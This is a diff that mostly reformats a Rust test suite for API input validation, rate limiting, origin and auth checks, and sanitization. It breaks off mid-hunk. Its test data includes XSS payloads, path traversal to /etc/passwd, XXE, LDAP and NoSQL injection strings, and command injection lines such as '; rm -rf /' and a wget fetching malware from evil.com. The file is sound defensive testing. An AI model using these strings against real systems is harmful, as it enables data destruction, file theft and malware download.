@@ -1,12 +1,12 @@
 //! API Validation and Security Tests
-//! 
+//!
 //! Tests for input validation, security measures, authentication,
 //! and API safety mechanisms
 
+use pretty_assertions::assert_eq;
 use std::collections::HashMap;
 use std::time::{Duration, Instant};
 use tokio::test;
-use pretty_assertions::assert_eq;
 
 use webxr::errors::*;
 
@@ -31,7 +31,7 @@ impl ValidationRule {
             allowed_values: None,
         }
     }
-    
+
     pub fn optional_field(name: &str) -> Self {
         Self {
             field_name: name.to_string(),
@@ -42,18 +42,18 @@ impl ValidationRule {
             allowed_values: None,
         }
     }
-    
+
     pub fn with_length_limits(mut self, min: Option<usize>, max: Option<usize>) -> Self {
         self.min_length = min;
         self.max_length = max;
         self
     }
-    
+
     pub fn with_pattern(mut self, pattern: &str) -> Self {
         self.pattern = Some(pattern.to_string());
         self
     }
-    
+
     pub fn with_allowed_values(mut self, values: Vec<&str>) -> Self {
         self.allowed_values = Some(values.iter().map(|s| s.to_string()).collect());
         self
@@ -70,11 +70,11 @@ impl InputValidator {
             rules: HashMap::new(),
         }
     }
-    
+
     pub fn add_rule(&mut self, rule: ValidationRule) {
         self.rules.insert(rule.field_name.clone(), rule);
     }
-    
+
     pub fn validate(&self, input: &HashMap<String, String>) -> Result<(), SettingsError> {
         // Check required fields
         for rule in self.rules.values() {
@@ -85,7 +85,7 @@ impl InputValidator {
                 });
             }
         }
-        
+
         // Validate present fields
         for (field_name, value) in input {
             if let Some(rule) = self.rules.get(field_name) {
@@ -98,10 +98,10 @@ impl InputValidator {
                 });
             }
         }
-        
+
         Ok(())
     }
-    
+
     fn validate_field(&self, rule: &ValidationRule, value: &str) -> Result<(), SettingsError> {
         // Check length constraints
         if let Some(min_len) = rule.min_length {
@@ -112,7 +112,7 @@ impl InputValidator {
                 });
             }
         }
-        
+
         if let Some(max_len) = rule.max_length {
             if value.len() > max_len {
                 return Err(SettingsError::ValidationFailed {
@@ -121,7 +121,7 @@ impl InputValidator {
                 });
             }
         }
-        
+
         // Check pattern matching
         if let Some(pattern) = &rule.pattern {
             // Simple pattern matching for tests (not full regex)
@@ -133,7 +133,7 @@ impl InputValidator {
                             reason: "Invalid email format".to_string(),
                         });
                     }
-                },
+                }
                 "numeric" => {
                     if value.parse::<f64>().is_err() {
                         return Err(SettingsError::ValidationFailed {
@@ -141,7 +141,7 @@ impl InputValidator {
                             reason: "Value must be numeric".to_string(),
                         });
                     }
-                },
+                }
                 "alphanumeric" => {
                     if !value.chars().all(|c| c.is_alphanumeric()) {
                         return Err(SettingsError::ValidationFailed {
@@ -149,7 +149,7 @@ impl InputValidator {
                             reason: "Value must contain only alphanumeric characters".to_string(),
                         });
                     }
-                },
+                }
                 _ => {
                     // For testing, just check if pattern string appears in value
                     if !value.contains(pattern) {
@@ -161,7 +161,7 @@ impl InputValidator {
                 }
             }
         }
-        
+
         // Check allowed values
         if let Some(allowed) = &rule.allowed_values {
             if !allowed.contains(&value.to_string()) {
@@ -171,7 +171,7 @@ impl InputValidator {
                 });
             }
         }
-        
+
         Ok(())
     }
 }
@@ -211,27 +211,30 @@ impl SecurityValidator {
             request_counts: HashMap::new(),
         }
     }
-    
-    pub fn validate_request(&mut self, 
-                          client_id: &str,
-                          origin: Option<&str>,
-                          content_type: Option<&str>,
-                          content_length: usize,
-                          auth_token: Option<&str>) -> Result<(), NetworkError> {
-        
+
+    pub fn validate_request(
+        &mut self,
+        client_id: &str,
+        origin: Option<&str>,
+        content_type: Option<&str>,
+        content_length: usize,
+        auth_token: Option<&str>,
+    ) -> Result<(), NetworkError> {
         // Check request size
         if content_length > self.policy.max_request_size {
             return Err(NetworkError::HTTPError {
                 url: "request_validation".to_string(),
                 status: Some(413),
-                reason: format!("Request too large: {} bytes, max: {} bytes", 
-                               content_length, self.policy.max_request_size),
+                reason: format!(
+                    "Request too large: {} bytes, max: {} bytes",
+                    content_length, self.policy.max_request_size
+                ),
             });
         }
-        
+
         // Check rate limiting
         self.check_rate_limit(client_id)?;
-        
+
         // Check origin
         if let Some(origin) = origin {
             if !self.policy.allowed_origins.contains(&origin.to_string()) {
@@ -242,7 +245,7 @@ impl SecurityValidator {
                 });
             }
         }
-        
+
         // Check content type
         if self.policy.validate_content_type {
             if let Some(content_type) = content_type {
@@ -261,7 +264,7 @@ impl SecurityValidator {
                 });
             }
         }
-        
+
         // Check authentication
         if self.policy.require_authentication {
             if auth_token.is_none() {
@@ -271,7 +274,7 @@ impl SecurityValidator {
                     reason: "Authentication token required".to_string(),
                 });
             }
-            
+
             if let Some(token) = auth_token {
                 if !self.validate_auth_token(token) {
                     return Err(NetworkError::HTTPError {
@@ -282,19 +285,20 @@ impl SecurityValidator {
                 }
             }
         }
-        
+
         Ok(())
     }
-    
+
     fn check_rate_limit(&mut self, client_id: &str) -> Result<(), NetworkError> {
         let now = Instant::now();
         let window_duration = Duration::from_secs(60); // 1 minute window
-        
-        let (window_start, count) = self.request_counts
+
+        let (window_start, count) = self
+            .request_counts
             .get(client_id)
             .cloned()
             .unwrap_or((now, 0));
-        
+
         if now.duration_since(window_start) > window_duration {
             // Reset window
             self.request_counts.insert(client_id.to_string(), (now, 1));
@@ -303,15 +307,18 @@ impl SecurityValidator {
             Err(NetworkError::HTTPError {
                 url: "rate_limit".to_string(),
                 status: Some(429),
-                reason: format!("Rate limit exceeded: {} requests per minute", 
-                               self.policy.rate_limit_per_minute),
+                reason: format!(
+                    "Rate limit exceeded: {} requests per minute",
+                    self.policy.rate_limit_per_minute
+                ),
             })
         } else {
-            self.request_counts.insert(client_id.to_string(), (window_start, count + 1));
+            self.request_counts
+                .insert(client_id.to_string(), (window_start, count + 1));
             Ok(())
         }
     }
-    
+
     fn is_allowed_content_type(&self, content_type: &str) -> bool {
         let allowed_types = [
             "application/json",
@@ -319,20 +326,22 @@ impl SecurityValidator {
             "multipart/form-data",
             "text/plain",
         ];
-        
-        allowed_types.iter().any(|&allowed| content_type.starts_with(allowed))
+
+        allowed_types
+            .iter()
+            .any(|&allowed| content_type.starts_with(allowed))
     }
-    
+
     fn validate_auth_token(&self, token: &str) -> bool {
         // Simple token validation for testing
         !token.is_empty() && token.len() >= 10 && !token.contains("invalid")
     }
-    
+
     pub fn sanitize_input(&self, input: &str) -> String {
         if !self.policy.sanitize_inputs {
             return input.to_string();
         }
-        
+
         // Basic input sanitization
         input
             .replace("<script>", "&lt;script&gt;")
@@ -394,20 +403,22 @@ impl APIValidationTestSuite {
         let mut all_passed = true;
 
         let mut validator = InputValidator::new();
-        
+
         // Add validation rules
-        validator.add_rule(ValidationRule::required_field("username")
-            .with_length_limits(Some(3), Some(20))
-            .with_pattern("alphanumeric"));
-        
-        validator.add_rule(ValidationRule::required_field("email")
-            .with_pattern("email"));
-        
-        validator.add_rule(ValidationRule::optional_field("age")
-            .with_pattern("numeric"));
-        
-        validator.add_rule(ValidationRule::required_field("role")
-            .with_allowed_values(vec!["admin", "user", "guest"]));
+        validator.add_rule(
+            ValidationRule::required_field("username")
+                .with_length_limits(Some(3), Some(20))
+                .with_pattern("alphanumeric"),
+        );
+
+        validator.add_rule(ValidationRule::required_field("email").with_pattern("email"));
+
+        validator.add_rule(ValidationRule::optional_field("age").with_pattern("numeric"));
+
+        validator.add_rule(
+            ValidationRule::required_field("role")
+                .with_allowed_values(vec!["admin", "user", "guest"]),
+        );
 
         // Test valid input
         let mut valid_input = HashMap::new();
@@ -425,7 +436,7 @@ impl APIValidationTestSuite {
         // Test missing required field
         let mut missing_field = valid_input.clone();
         missing_field.remove("username");
-        
+
         let result = validator.validate(&missing_field);
         if result.is_ok() {
             eprintln!("Missing required field should fail validation");
@@ -436,7 +447,7 @@ impl APIValidationTestSuite {
         // Test field too short
         let mut short_field = valid_input.clone();
         short_field.insert("username".to_string(), "ab".to_string());
-        
+
         let result = validator.validate(&short_field);
         if result.is_ok() {
             eprintln!("Username too short should fail validation");
@@ -447,7 +458,7 @@ impl APIValidationTestSuite {
         // Test field too long
         let mut long_field = valid_input.clone();
         long_field.insert("username".to_string(), "a".repeat(25));
-        
+
         let result = validator.validate(&long_field);
         if result.is_ok() {
             eprintln!("Username too long should fail validation");
@@ -458,7 +469,7 @@ impl APIValidationTestSuite {
         // Test invalid email pattern
         let mut invalid_email = valid_input.clone();
         invalid_email.insert("email".to_string(), "not-an-email".to_string());
-        
+
         let result = validator.validate(&invalid_email);
         if result.is_ok() {
             eprintln!("Invalid email should fail validation");
@@ -469,7 +480,7 @@ impl APIValidationTestSuite {
         // Test invalid numeric field
         let mut invalid_numeric = valid_input.clone();
         invalid_numeric.insert("age".to_string(), "not-a-number".to_string());
-        
+
         let result = validator.validate(&invalid_numeric);
         if result.is_ok() {
             eprintln!("Non-numeric age should fail validation");
@@ -480,7 +491,7 @@ impl APIValidationTestSuite {
         // Test invalid role
         let mut invalid_role = valid_input.clone();
         invalid_role.insert("role".to_string(), "invalid_role".to_string());
-        
+
         let result = validator.validate(&invalid_role);
         if result.is_ok() {
             eprintln!("Invalid role should fail validation");
@@ -491,7 +502,7 @@ impl APIValidationTestSuite {
         // Test unknown field
         let mut unknown_field = valid_input.clone();
         unknown_field.insert("unknown_field".to_string(), "value".to_string());
-        
+
         let result = validator.validate(&unknown_field);
         if result.is_ok() {
             eprintln!("Unknown field should fail validation");
@@ -508,42 +519,51 @@ impl APIValidationTestSuite {
         let mut all_passed = true;
 
         let mut validator = InputValidator::new();
-        
+
         // Test various constraint combinations
-        validator.add_rule(ValidationRule::required_field("password")
-            .with_length_limits(Some(8), Some(128)));
-        
-        validator.add_rule(ValidationRule::optional_field("description")
-            .with_length_limits(None, Some(500)));
+        validator.add_rule(
+            ValidationRule::required_field("password").with_length_limits(Some(8), Some(128)),
+        );
+
+        validator.add_rule(
+            ValidationRule::optional_field("description").with_length_limits(None, Some(500)),
+        );
 
         // Test boundary conditions
         let test_cases = vec![
-            ("password", "1234567", false),   // Too short (7 chars)
-            ("password", "12345678", true),   // Minimum length (8 chars)
-            ("password", "a".repeat(128), true), // Maximum length
-            ("password", "a".repeat(129), false), // Too long
-            ("description", "", true),        // Optional field can be empty
-            ("description", "a".repeat(500), true), // Maximum length
+            ("password", "1234567", false),          // Too short (7 chars)
+            ("password", "12345678", true),          // Minimum length (8 chars)
+            ("password", "a".repeat(128), true),     // Maximum length
+            ("password", "a".repeat(129), false),    // Too long
+            ("description", "", true),               // Optional field can be empty
+            ("description", "a".repeat(500), true),  // Maximum length
             ("description", "a".repeat(501), false), // Too long
         ];
 
         for (field, value, should_pass) in test_cases {
             let mut input = HashMap::new();
             input.insert(field.to_string(), value.to_string());
-            
+
             // Add required password if testing description
             if field == "description" {
                 input.insert("password".to_string(), "validpassword".to_string());
             }
 
             let result = validator.validate(&input);
-            
+
             if should_pass && result.is_err() {
-                eprintln!("Field '{}' with value '{}' should pass but failed: {:?}", 
-                         field, value, result.err());
+                eprintln!(
+                    "Field '{}' with value '{}' should pass but failed: {:?}",
+                    field,
+                    value,
+                    result.err()
+                );
                 all_passed = false;
             } else if !should_pass && result.is_ok() {
-                eprintln!("Field '{}' with value '{}' should fail but passed", field, value);
+                eprintln!(
+                    "Field '{}' with value '{}' should fail but passed",
+                    field, value
+                );
                 all_passed = false;
                 self.input_validation_failures += 1;
             }
@@ -574,11 +594,14 @@ impl APIValidationTestSuite {
             Some("https://trusted.com"),
             Some("application/json"),
             512,
-            Some("valid_token_123")
+            Some("valid_token_123"),
         );
 
         if result.is_err() {
-            eprintln!("Valid request should pass security validation: {:?}", result.err());
+            eprintln!(
+                "Valid request should pass security validation: {:?}",
+                result.err()
+            );
             all_passed = false;
         }
 
@@ -588,7 +611,7 @@ impl APIValidationTestSuite {
             Some("https://trusted.com"),
             Some("application/json"),
             2048, // Exceeds max_request_size of 1024
-            Some("valid_token_123")
+            Some("valid_token_123"),
         );
 
         if result.is_ok() {
@@ -597,9 +620,11 @@ impl APIValidationTestSuite {
             self.security_violations_detected += 1;
         } else {
             match result.err().unwrap() {
-                NetworkError::HTTPError { status: Some(413), .. } => {
+                NetworkError::HTTPError {
+                    status: Some(413), ..
+                } => {
                     // Expected error code for request too large
-                },
+                }
                 _ => {
                     eprintln!("Should get HTTP 413 for oversized request");
                     all_passed = false;
@@ -613,7 +638,7 @@ impl APIValidationTestSuite {
             Some("https://malicious.com"),
             Some("application/json"),
             512,
-            Some("valid_token_123")
+            Some("valid_token_123"),
         );
 
         if result.is_ok() {
@@ -628,7 +653,7 @@ impl APIValidationTestSuite {
             Some("https://trusted.com"),
             Some("application/json"),
             512,
-            None // No auth token
+            None, // No auth token
         );
 
         if result.is_ok() {
@@ -660,11 +685,15 @@ impl APIValidationTestSuite {
                 Some("https://localhost"),
                 Some("application/json"),
                 100,
-                Some("valid_token_123")
+                Some("valid_token_123"),
             );
 
             if result.is_err() {
-                eprintln!("Request {} within rate limit should succeed: {:?}", i, result.err());
+                eprintln!(
+                    "Request {} within rate limit should succeed: {:?}",
+                    i,
+                    result.err()
+                );
                 all_passed = false;
             }
         }
@@ -675,7 +704,7 @@ impl APIValidationTestSuite {
             Some("https://localhost"),
             Some("application/json"),
             100,
-            Some("valid_token_123")
+            Some("valid_token_123"),
         );
 
         if result.is_ok() {
@@ -684,9 +713,11 @@ impl APIValidationTestSuite {
             self.security_violations_detected += 1;
         } else {
             match result.err().unwrap() {
-                NetworkError::HTTPError { status: Some(429), .. } => {
+                NetworkError::HTTPError {
+                    status: Some(429), ..
+                } => {
                     // Expected rate limit error
-                },
+                }
                 _ => {
                     eprintln!("Should get HTTP 429 for rate limit exceeded");
                     all_passed = false;
@@ -700,11 +731,14 @@ impl APIValidationTestSuite {
             Some("https://localhost"),
             Some("application/json"),
             100,
-            Some("valid_token_123")
+            Some("valid_token_123"),
         );
 
         if result.is_err() {
-            eprintln!("Different client should not be affected by rate limiting: {:?}", result.err());
+            eprintln!(
+                "Different client should not be affected by rate limiting: {:?}",
+                result.err()
+            );
             all_passed = false;
         }
 
@@ -720,11 +754,7 @@ impl APIValidationTestSuite {
         let mut security_validator = SecurityValidator::new(policy);
 
         // Test valid authentication tokens
-        let valid_tokens = vec![
-            "valid_token_123",
-            "bearer_token_456",
-            "jwt_token_789abc",
-        ];
+        let valid_tokens = vec!["valid_token_123", "bearer_token_456", "jwt_token_789abc"];
 
         for token in valid_tokens {
             let result = security_validator.validate_request(
@@ -732,20 +762,24 @@ impl APIValidationTestSuite {
                 Some("https://localhost"),
                 Some("application/json"),
                 100,
-                Some(token)
+                Some(token),
             );
 
             if result.is_err() {
-                eprintln!("Valid token '{}' should be accepted: {:?}", token, result.err());
+                eprintln!(
+                    "Valid token '{}' should be accepted: {:?}",
+                    token,
+                    result.err()
+                );
                 all_passed = false;
             }
         }
 
         // Test invalid authentication tokens
         let invalid_tokens = vec![
-            "",                    // Empty token
-            "short",              // Too short
-            "invalid_token",      // Contains "invalid"
+            "",              // Empty token
+            "short",         // Too short
+            "invalid_token", // Contains "invalid"
         ];
 
         for token in invalid_tokens {
@@ -754,7 +788,7 @@ impl APIValidationTestSuite {
                 Some("https://localhost"),
                 Some("application/json"),
                 100,
-                Some(token)
+                Some(token),
             );
 
             if result.is_ok() {
@@ -777,11 +811,14 @@ impl APIValidationTestSuite {
             Some("https://localhost"),
             Some("application/json"),
             100,
-            None // No token should be okay
+            None, // No token should be okay
         );
 
         if result.is_err() {
-            eprintln!("Request without token should pass when authentication is disabled: {:?}", result.err());
+            eprintln!(
+                "Request without token should pass when authentication is disabled: {:?}",
+                result.err()
+            );
             all_passed = false;
         }
 
@@ -817,11 +854,15 @@ impl APIValidationTestSuite {
                 Some(origin),
                 Some("application/json"),
                 100,
-                Some("valid_token_123")
+                Some("valid_token_123"),
             );
 
             if result.is_err() {
-                eprintln!("Allowed origin '{}' should be accepted: {:?}", origin, result.err());
+                eprintln!(
+                    "Allowed origin '{}' should be accepted: {:?}",
+                    origin,
+                    result.err()
+                );
                 all_passed = false;
             }
         }
@@ -840,7 +881,7 @@ impl APIValidationTestSuite {
                 Some(origin),
                 Some("application/json"),
                 100,
-                Some("valid_token_123")
+                Some("valid_token_123"),
             );
 
             if result.is_ok() {
@@ -856,13 +897,16 @@ impl APIValidationTestSuite {
             None,
             Some("application/json"),
             100,
-            Some("valid_token_123")
+            Some("valid_token_123"),
         );
 
         // Missing origin might be allowed or rejected based on policy
         // For this test, we'll allow it since the origin check only applies when present
         if result.is_err() {
-            eprintln!("Missing origin should be handled gracefully: {:?}", result.err());
+            eprintln!(
+                "Missing origin should be handled gracefully: {:?}",
+                result.err()
+            );
             all_passed = false;
         }
 
@@ -892,11 +936,15 @@ impl APIValidationTestSuite {
                 Some("https://localhost"),
                 Some(content_type),
                 100,
-                Some("valid_token_123")
+                Some("valid_token_123"),
             );
 
             if result.is_err() {
-                eprintln!("Allowed content type '{}' should be accepted: {:?}", content_type, result.err());
+                eprintln!(
+                    "Allowed content type '{}' should be accepted: {:?}",
+                    content_type,
+                    result.err()
+                );
                 all_passed = false;
             }
         }
@@ -915,11 +963,14 @@ impl APIValidationTestSuite {
                 Some("https://localhost"),
                 Some(content_type),
                 100,
-                Some("valid_token_123")
+                Some("valid_token_123"),
             );
 
             if result.is_ok() {
-                eprintln!("Disallowed content type '{}' should be rejected", content_type);
+                eprintln!(
+                    "Disallowed content type '{}' should be rejected",
+                    content_type
+                );
                 all_passed = false;
                 self.security_violations_detected += 1;
             }
@@ -931,7 +982,7 @@ impl APIValidationTestSuite {
             Some("https://localhost"),
             None,
             100,
-            Some("valid_token_123")
+            Some("valid_token_123"),
         );
 
         if result.is_ok() {
@@ -953,11 +1004,14 @@ impl APIValidationTestSuite {
             Some("https://localhost"),
             None, // Missing content type
             100,
-            Some("valid_token_123")
+            Some("valid_token_123"),
         );
 
         if result.is_err() {
-            eprintln!("Missing content type should be allowed when validation is disabled: {:?}", result.err());
+            eprintln!(
+                "Missing content type should be allowed when validation is disabled: {:?}",
+                result.err()
+            );
             all_passed = false;
         }
 
@@ -985,11 +1039,15 @@ impl APIValidationTestSuite {
                 Some("https://localhost"),
                 Some("application/json"),
                 size,
-                Some("valid_token_123")
+                Some("valid_token_123"),
             );
 
             if result.is_err() {
-                eprintln!("Request size {} should be allowed (limit: 1024): {:?}", size, result.err());
+                eprintln!(
+                    "Request size {} should be allowed (limit: 1024): {:?}",
+                    size,
+                    result.err()
+                );
                 all_passed = false;
             }
         }
@@ -1003,7 +1061,7 @@ impl APIValidationTestSuite {
                 Some("https://localhost"),
                 Some("application/json"),
                 size,
-                Some("valid_token_123")
+                Some("valid_token_123"),
             );
 
             if result.is_ok() {
@@ -1012,9 +1070,11 @@ impl APIValidationTestSuite {
                 self.security_violations_detected += 1;
             } else {
                 match result.err().unwrap() {
-                    NetworkError::HTTPError { status: Some(413), .. } => {
+                    NetworkError::HTTPError {
+                        status: Some(413), ..
+                    } => {
                         // Expected "Payload Too Large" error
-                    },
+                    }
                     _ => {
                         eprintln!("Should get HTTP 413 for oversized request");
                         all_passed = false;
@@ -1036,8 +1096,14 @@ impl APIValidationTestSuite {
 
         // Test HTML/XSS sanitization
         let test_cases = vec![
-            ("<script>alert('xss')</script>", "&lt;script&gt;alert('xss')&lt;/script&gt;"),
-            ("<img src='x' onerror='alert(1)'>", "&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(1)&#x27;&gt;"),
+            (
+                "<script>alert('xss')</script>",
+                "&lt;script&gt;alert('xss')&lt;/script&gt;",
+            ),
+            (
+                "<img src='x' onerror='alert(1)'>",
+                "&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(1)&#x27;&gt;",
+            ),
             ("Normal text", "Normal text"),
             ("<b>Bold</b>", "&lt;b&gt;Bold&lt;/b&gt;"),
             ("\"quotes\"", "&quot;quotes&quot;"),
@@ -1047,10 +1113,12 @@ impl APIValidationTestSuite {
 
         for (input, expected) in test_cases {
             let sanitized = security_validator.sanitize_input(input);
-            
+
             if sanitized != expected {
-                eprintln!("Input '{}' not sanitized correctly: expected '{}', got '{}'", 
-                         input, expected, sanitized);
+                eprintln!(
+                    "Input '{}' not sanitized correctly: expected '{}', got '{}'",
+                    input, expected, sanitized
+                );
                 all_passed = false;
             }
         }
@@ -1065,7 +1133,7 @@ impl APIValidationTestSuite {
 
         let dangerous_input = "<script>alert('xss')</script>";
         let sanitized = no_sanitize_validator.sanitize_input(dangerous_input);
-        
+
         if sanitized != dangerous_input {
             eprintln!("Input should not be sanitized when sanitization is disabled");
             all_passed = false;
@@ -1096,13 +1164,17 @@ impl APIValidationTestSuite {
 
         for payload in xss_payloads {
             let sanitized = security_validator.sanitize_input(payload);
-            
+
             // Check that dangerous elements are escaped
-            if sanitized.contains("<script>") || 
-               sanitized.contains("javascript:") || 
-               sanitized.contains("onerror=") ||
-               sanitized.contains("onload=") {
-                eprintln!("XSS payload not properly sanitized: '{}' -> '{}'", payload, sanitized);
+            if sanitized.contains("<script>")
+                || sanitized.contains("javascript:")
+                || sanitized.contains("onerror=")
+                || sanitized.contains("onload=")
+            {
+                eprintln!(
+                    "XSS payload not properly sanitized: '{}' -> '{}'",
+                    payload, sanitized
+                );
                 all_passed = false;
                 self.security_violations_detected += 1;
             }
@@ -1119,12 +1191,14 @@ impl APIValidationTestSuite {
 
         for input in legitimate_inputs {
             let sanitized = security_validator.sanitize_input(input);
-            
+
             // For legitimate content, only & should be escaped to &amp;
             let expected = input.replace("&", "&amp;");
             if sanitized != expected {
-                eprintln!("Legitimate input modified unexpectedly: '{}' -> '{}' (expected '{}')", 
-                         input, sanitized, expected);
+                eprintln!(
+                    "Legitimate input modified unexpectedly: '{}' -> '{}' (expected '{}')",
+                    input, sanitized, expected
+                );
                 all_passed = false;
             }
         }
@@ -1138,10 +1212,8 @@ impl APIValidationTestSuite {
         let mut all_passed = true;
 
         let mut validator = InputValidator::new();
-        validator.add_rule(ValidationRule::required_field("user_id")
-            .with_pattern("numeric"));
-        validator.add_rule(ValidationRule::required_field("username")
-            .with_pattern("alphanumeric"));
+        validator.add_rule(ValidationRule::required_field("user_id").with_pattern("numeric"));
+        validator.add_rule(ValidationRule::required_field("username").with_pattern("alphanumeric"));
 
         // Test SQL injection payloads
         let sql_injection_payloads = vec![
@@ -1159,7 +1231,7 @@ impl APIValidationTestSuite {
             input.insert("username".to_string(), "testuser".to_string());
 
             let result = validator.validate(&input);
-            
+
             if result.is_ok() {
                 eprintln!("SQL injection payload should be rejected: '{}'", payload);
                 all_passed = false;
@@ -1180,10 +1252,14 @@ impl APIValidationTestSuite {
             input.insert("username".to_string(), username.to_string());
 
             let result = validator.validate(&input);
-            
+
             if result.is_err() {
-                eprintln!("Legitimate input should pass validation: user_id='{}', username='{}': {:?}", 
-                         user_id, username, result.err());
+                eprintln!(
+                    "Legitimate input should pass validation: user_id='{}', username='{}': {:?}",
+                    user_id,
+                    username,
+                    result.err()
+                );
                 all_passed = false;
             }
         }
@@ -1197,23 +1273,25 @@ impl APIValidationTestSuite {
         let mut all_passed = true;
 
         let mut validator = InputValidator::new();
-        validator.add_rule(ValidationRule::required_field("comment")
-            .with_length_limits(Some(1), Some(1000)));
-        validator.add_rule(ValidationRule::required_field("title")
-            .with_length_limits(Some(1), Some(100)));
+        validator.add_rule(
+            ValidationRule::required_field("comment").with_length_limits(Some(1), Some(1000)),
+        );
+        validator.add_rule(
+            ValidationRule::required_field("title").with_length_limits(Some(1), Some(100)),
+        );
 
         // Test buffer overflow attempts
         let overflow_attempts = vec![
-            ("comment", "A".repeat(10000)),  // Way too long
-            ("comment", "B".repeat(5000)),   // Still too long  
-            ("title", "C".repeat(1000)),     // Too long for title
-            ("title", "D".repeat(500)),      // Still too long
+            ("comment", "A".repeat(10000)), // Way too long
+            ("comment", "B".repeat(5000)),  // Still too long
+            ("title", "C".repeat(1000)),    // Too long for title
+            ("title", "D".repeat(500)),     // Still too long
         ];
 
         for (field, value) in overflow_attempts {
             let mut input = HashMap::new();
             input.insert(field.to_string(), value.clone());
-            
+
             // Add other required fields
             if field != "comment" {
                 input.insert("comment".to_string(), "Valid comment".to_string());
@@ -1223,10 +1301,13 @@ impl APIValidationTestSuite {
             }
 
             let result = validator.validate(&input);
-            
+
             if result.is_ok() {
-                eprintln!("Buffer overflow attempt should be rejected: field='{}', length={}", 
-                         field, value.len());
+                eprintln!(
+                    "Buffer overflow attempt should be rejected: field='{}', length={}",
+                    field,
+                    value.len()
+                );
                 all_passed = false;
                 self.security_violations_detected += 1;
             }
@@ -1234,16 +1315,16 @@ impl APIValidationTestSuite {
 
         // Test maximum allowed lengths
         let max_length_tests = vec![
-            ("comment", "A".repeat(1000)),  // Exactly at limit
-            ("comment", "B".repeat(999)),   // Just under limit
-            ("title", "C".repeat(100)),     // Exactly at limit
-            ("title", "D".repeat(99)),      // Just under limit
+            ("comment", "A".repeat(1000)), // Exactly at limit
+            ("comment", "B".repeat(999)),  // Just under limit
+            ("title", "C".repeat(100)),    // Exactly at limit
+            ("title", "D".repeat(99)),     // Just under limit
         ];
 
         for (field, value) in max_length_tests {
             let mut input = HashMap::new();
             input.insert(field.to_string(), value.clone());
-            
+
             // Add other required fields
             if field != "comment" {
                 input.insert("comment".to_string(), "Valid comment".to_string());
@@ -1253,10 +1334,14 @@ impl APIValidationTestSuite {
             }
 
             let result = validator.validate(&input);
-            
+
             if result.is_err() {
-                eprintln!("Maximum length input should be allowed: field='{}', length={}: {:?}", 
-                         field, value.len(), result.err());
+                eprintln!(
+                    "Maximum length input should be allowed: field='{}', length={}: {:?}",
+                    field,
+                    value.len(),
+                    result.err()
+                );
                 all_passed = false;
             }
         }
@@ -1278,19 +1363,15 @@ impl APIValidationTestSuite {
             "../../../etc/passwd",
             "..\\..\\..\\windows\\system32\\config\\sam",
             "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-            
             // Command injection
             "; rm -rf /",
             "| cat /etc/passwd",
             "&& wget http://evil.com/malware",
-            
             // LDAP injection
             "*)(uid=*",
             "*)(|(password=*))",
-            
             // XML/XXE attacks
             "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>",
-            
             // NoSQL injection
             "{\"$ne\": null}",
             "{\"$where\": \"this.password == 'password' || '1'=='1'\"}",
@@ -1298,14 +1379,18 @@ impl APIValidationTestSuite {
 
         for input in malicious_inputs {
             let sanitized = security_validator.sanitize_input(input);
-            
+
             // Check that dangerous characters are escaped
-            if sanitized.contains("../") || 
-               sanitized.contains("..\\") ||
-               sanitized.contains("<!ENTITY") ||
-               sanitized.contains("$ne") ||
-               sanitized.contains("$where") {
-                eprintln!("Malicious input not properly sanitized: '{}' -> '{}'", input, sanitized);
+            if sanitized.contains("../")
+                || sanitized.contains("..\\")
+                || sanitized.contains("<!ENTITY")
+                || sanitized.contains("$ne")
+                || sanitized.contains("$where")
+            {
+                eprintln!(
+                    "Malicious input not properly sanitized: '{}' -> '{}'",
+                    input, sanitized
+                );
                 all_passed = false;
                 self.security_violations_detected += 1;
             }
@@ -1313,17 +1398,20 @@ impl APIValidationTestSuite {
 
         // Test input validation catches patterns
         let mut validator = InputValidator::new();
-        validator.add_rule(ValidationRule::required_field("filename")
-            .with_pattern("alphanumeric"));
+        validator.add_rule(ValidationRule::required_field("filename").with_pattern("alphanumeric"));
 
-        for input in &malicious_inputs[0..6] { // Test path traversal and command injection
+        for input in &malicious_inputs[0..6] {
+            // Test path traversal and command injection
             let mut test_input = HashMap::new();
             test_input.insert("filename".to_string(), input.to_string());
 
             let result = validator.validate(&test_input);
-            
+
             if result.is_ok() {
-                eprintln!("Malicious filename should be rejected by pattern validation: '{}'", input);
+                eprintln!(
+                    "Malicious filename should be rejected by pattern validation: '{}'",
+                    input
+                );
                 all_passed = false;
                 self.security_violations_detected += 1;
             }
@@ -1351,19 +1439,19 @@ impl APIValidationTestSuite {
         // Spawn concurrent validation requests
         for i in 0..20 {
             let validator_clone = Arc::clone(&security_validator);
-            
+
             let handle = thread::spawn(move || {
                 let mut validator = validator_clone.lock().unwrap();
-                
+
                 validator.validate_request(
                     &format!("concurrent_client_{}", i % 5), // 5 different clients
                     Some("https://localhost"),
                     Some("application/json"),
                     100,
-                    Some("valid_token_123")
+                    Some("valid_token_123"),
                 )
             });
-            
+
             handles.push(handle);
         }
 
@@ -1376,15 +1464,17 @@ impl APIValidationTestSuite {
             match handle.join() {
                 Ok(Ok(())) => {
                     successful_requests += 1;
-                },
-                Ok(Err(NetworkError::HTTPError { status: Some(429), .. })) => {
+                }
+                Ok(Err(NetworkError::HTTPError {
+                    status: Some(429), ..
+                })) => {
                     rate_limited_requests += 1;
-                },
+                }
                 Ok(Err(e)) => {
                     eprintln!("Unexpected error in concurrent validation: {:?}", e);
                     other_errors += 1;
                     all_passed = false;
-                },
+                }
                 Err(_) => {
                     eprintln!("Thread panicked during concurrent validation");
                     all_passed = false;
@@ -1392,8 +1482,10 @@ impl APIValidationTestSuite {
             }
         }
 
-        println!("Concurrent validation results: {} successful, {} rate-limited, {} errors", 
-                successful_requests, rate_limited_requests, other_errors);
+        println!(
+            "Concurrent validation results: {} successful, {} rate-limited, {} errors",
+            successful_requests, rate_limited_requests, other_errors
+        );
 
         // With 5 clients each making 4 requests and a rate limit of 10/minute per client,
         // some requests should succeed and some should be rate limited
@@ -1419,32 +1511,17 @@ impl APIValidationTestSuite {
         let mut security_validator = SecurityValidator::new(policy);
 
         // Test that error messages don't leak sensitive information
-        let test_cases = vec![
-            // Rate limiting
-            (|| security_validator.validate_request(
-                "leak_test_client",
-                Some("https://localhost"),
-                Some("application/json"),
-                100,
-                Some("valid_token_123"))), // First call to set up rate limiting
-            ),
-            (|| security_validator.validate_request(
-                "leak_test_client",
-                Some("https://localhost"),
-                Some("application/json"),
-                100,
